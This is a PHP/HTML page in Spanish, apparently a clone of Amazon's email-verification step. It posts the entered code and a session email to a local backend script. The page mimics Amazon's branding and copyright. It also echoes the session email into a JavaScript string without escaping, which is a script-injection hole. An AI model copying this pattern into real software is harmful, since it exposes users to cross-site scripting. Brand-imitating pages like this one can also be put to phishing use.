<?php
session_start();
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verificar dirección de correo electrónico - Amazon</title>
    <link rel="stylesheet" href="css/cambiar_datos_email2.css">
    <script>
        function handleVerification() {
            var code = document.querySelector(".code-input").value;

            fetch('BACK/actualizar_email3.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: "<?php echo isset($_SESSION['temporal_email']) ? $_SESSION['temporal_email'] : ''; ?>",
                    code: code
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Received response:", data);
                if (data.success) {
                    alert("Código de verificación correcto. Correo electrónico actualizado.");
                    window.location.href = 'cambiar_datos.php';
                } else {
                    alert("Código incorrecto. Inténtalo de nuevo.");
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</head>
<body>
    <section class="flex1">
        <div class="logo">
            <img src="https://abellagraphicdesign.com/wp-content/uploads/2023/02/DESTACADA_0014_Fondo-copia-6.jpg" alt="Amazon Logo"/>
        </div>
    </section>
    <div class="container">
        <h2 class="title">Verificar dirección de correo electrónico</h2>
        <p><span><?php echo isset($_SESSION['temporal_email']) ? htmlspecialchars($_SESSION['temporal_email']) : 'correo@example.com'; ?></span> (<a href="#" class="change-email">Cambiar</a>)</p>

        <label>Enviamos un código a tu dirección de correo electrónico. Escríbelo a continuación.</label>
        <b><p>Escribir código</p></b>
        <input type="text" class="code-input">
        <div class="button-container">
            <button class="button" onclick="handleVerification()">Continuar</button>
        </div>
        <div class="code2">
            <a href="#" class="volver">Volver a enviar código</a>
        </div>
    </div>
    <section class="flex2">
        <div class="links">
            <a href="#" class="help">Ayuda</a> | <a href="#" class="terms">Condiciones de Uso</a> | <a href="#" class="privacy">Aviso de Privacidad</a>
            <p>&copy; 1996-2024 Amazon.com, Inc. o sus afiliados</p>
        </div>
    </section>
</body>
</html>
